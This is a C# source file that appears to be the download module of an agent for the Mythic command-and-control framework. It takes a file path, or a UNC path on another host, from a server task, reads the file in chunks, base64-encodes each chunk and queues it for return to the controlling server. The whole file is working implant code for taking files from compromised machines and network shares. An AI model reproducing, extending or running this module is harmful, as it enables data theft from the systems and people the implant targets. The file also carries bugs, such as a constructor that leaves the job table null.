using Agent.Interfaces;
using Agent.Models;
using Agent.Models.Responses;
using Agent.Models.Tasks;
using Agent.Utilities;
using System.Collections.Concurrent;
using System.Diagnostics;

namespace Agent.Managers
{
    public class DownloadManager : IDownloadManager
    {
        private ILogger logger { get; set; }
        private IMessageManager messageManager { get; set; }
        public DownloadManager(ILogger logger, IMessageManager messageManager)
        {
            this.logger = logger;
            this.messageManager = messageManager;
        }
        private ConcurrentDictionary<string, MythicDownloadJob> downloadJobs { get; set; }
        public DownloadManager()
        {
            downloadJobs = new ConcurrentDictionary<string, MythicDownloadJob>();
        }
        /// <summary>
        /// Create and start a new download job
        /// </summary>
        /// <param name="job">MythicJob containing the job task</param>
        public async Task StartJob(MythicJob job)
        {
            MythicDownloadJob downloadJob = new MythicDownloadJob(job);
            Dictionary<string, string> par = Misc.ConvertJsonStringToDict(job.task.parameters);
            downloadJob.path = par["file"].Replace("\"", string.Empty);
            if (par.ContainsKey("host") && !string.IsNullOrEmpty(par["host"]))
            {
                if (!par["file"].Contains(":") && !par["file"].StartsWith("\\\\")) //It's not a local path, and it's not already in UNC format
                {
                    downloadJob.path = @"\\" + par["host"] + @"\" + par["file"];
                }
            }
            downloadJob.total_chunks = await GetTotalChunks(downloadJob);
            downloadJobs.GetOrAdd(job.task.id, downloadJob);
            Debug.WriteLine($"[{DateTime.Now}] Starting download job ({downloadJob.chunk_num}/{downloadJob.total_chunks})");
            if (downloadJob.total_chunks == 0)
            {
                downloadJobs.Remove(job.task.id, out _);

                await messageManager.AddResponse(new DownloadResponse
                {
                    status = "error",
                    process_response = new Dictionary<string, string> { { "message", "0x16" } },
                    completed = true,
                    task_id = job.task.id
                }.ToJson());
            }

           await messageManager.AddResponse(new DownloadResponse
            {
                download = new DownloadResponseData()
                {
                    total_chunks = downloadJob.total_chunks,
                    full_path = downloadJob.path,
                    chunk_num = 0,
                    chunk_data = string.Empty,
                    is_screenshot = false,
                    host = "",
                },
                user_output = string.Empty,
                task_id = job.task.id,
                completed = false,
                status = string.Empty,
                file_id = null
            }.ToJson());
        }
        /// <summary>
        /// Check to see if a download job has started
        /// </summary>
        /// <param name="task_id">ID of the download job</param>
        public bool ContainsJob(string task_id)
        {
            return downloadJobs.ContainsKey(task_id);
        }
        /// <summary>
        /// Get a download job by ID
        /// </summary>
        /// <param name="task_id">ID of the download job</param>
        public async Task<MythicDownloadJob> GetJob(string task_id)
        {
            return downloadJobs[task_id];
        }
        /// <summary>
        /// Read the next chunk from the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        public async Task<string> HandleNextChunk(MythicDownloadJob job)
        {
            try
            {
                FileStream fileStream = new FileStream(job.path, FileMode.Open, FileAccess.Read);
                if (job.total_chunks == 1)
                {
                    job.complete = true;
                    return Misc.Base64Encode(await File.ReadAllBytesAsync(job.path));
                }
                byte[] buffer = new byte[job.chunk_size];

                long totalBytesRead = job.chunk_size * (job.chunk_num - 1);

                using (fileStream)
                {
                    FileInfo fileInfo = new FileInfo(job.path);

                    if (fileInfo.Length - totalBytesRead < job.chunk_size)
                    {
                        job.complete = true;
                        buffer = new byte[fileInfo.Length - job.bytesRead];
                    }

                    fileStream.Seek(job.bytesRead, SeekOrigin.Begin);
                    job.bytesRead += fileStream.Read(buffer, 0, buffer.Length);

                    return Misc.Base64Encode(buffer);
                }
            }
            catch (Exception e)
            {
                job.complete = true;
                return e.Message;
            }
        }

        /// <summary>
        /// Return the number of chunks required to download the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        private async Task<int> GetTotalChunks(MythicDownloadJob job)
        {
            try
            {
                var fi = new FileInfo(job.path);
                int total_chunks = (int)(fi.Length + job.chunk_size - 1) / job.chunk_size;
                return total_chunks;
            }
            catch
            {
                return 0;
            }
        }
        /// <summary>
        /// Complete and remove the download job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the download job to complete</param>
        public void CompleteDownloadJob(string task_id)
        {
            downloadJobs.Remove(task_id, out _);
        }

        /// <summary>
        /// Begin the next process of the download task
        /// </summary>
        /// <param name="response">The MythicResponseResult object provided from the Mythic server</param>
        public async Task HandleNextMessage(MythicResponseResult response)
        {
            MythicDownloadJob downloadJob = await this.GetJob(response.task_id);

            if (downloadJob.cancellationtokensource.IsCancellationRequested)
            {
                //Need to figure out how to track jobs/replace this
                //TaskResponseHandler.activeJobs.Remove(response.task_id, out _);
                this.CompleteDownloadJob(response.task_id);
            }

            DownloadResponse dr = new DownloadResponse()
            {
                task_id = response.task_id,
                download = new DownloadResponseData
                {
                    is_screenshot = false,
                    host = ""
                }
            };

            if (String.IsNullOrEmpty(downloadJob.file_id))
            {
                if (string.IsNullOrEmpty(response.file_id))
                {
                    this.CompleteDownloadJob(response.task_id);
                    //Need to figure out how to track jobs/replace this
                    //TaskResponseHandler.activeJobs.Remove(response.task_id, out _);
                    dr.status = "error";
                    dr.process_response = new Dictionary<string, string> { { "message", "0x13" } };
                    dr.completed = true;

                    await messageManager.AddResponse(dr.ToJson());
                    return;
                }

                downloadJob.file_id = response.file_id;
            }

            if (response.status != "success")
            {
                dr.file_id = downloadJob.file_id;
                dr.download.chunk_num = downloadJob.chunk_num;
                Debug.WriteLine($"[{DateTime.Now}] Handling next chunk for file {downloadJob.file_id} ({downloadJob.chunk_num}/{downloadJob.total_chunks})");

                dr.download.chunk_data = await this.HandleNextChunk(downloadJob);

                await messageManager.AddResponse(dr.ToJson());
                return;
            }


            downloadJob.chunk_num++;
            dr.file_id = downloadJob.file_id;
            dr.status = "processed";
            dr.user_output = String.Empty;
            dr.download.full_path = downloadJob.path;
            dr.download.total_chunks = -1;
            dr.download.file_id = downloadJob.file_id;
            dr.download.chunk_num = downloadJob.chunk_num;
            dr.download.chunk_data = await this.HandleNextChunk(downloadJob);
            Debug.WriteLine($"[{DateTime.Now}] Handling next chunk for file {downloadJob.file_id} ({downloadJob.chunk_num}/{downloadJob.total_chunks})");
            if (downloadJob.chunk_num == downloadJob.total_chunks)
            {
                dr.status = String.Empty;
                dr.completed = true;
                this.CompleteDownloadJob(response.task_id);
                //Need to figure out how to track jobs/replace this
                //TaskResponseHandler.activeJobs.Remove(response.task_id, out _);
            }

            await messageManager.AddResponse(dr.ToJson());
        }

    }
}
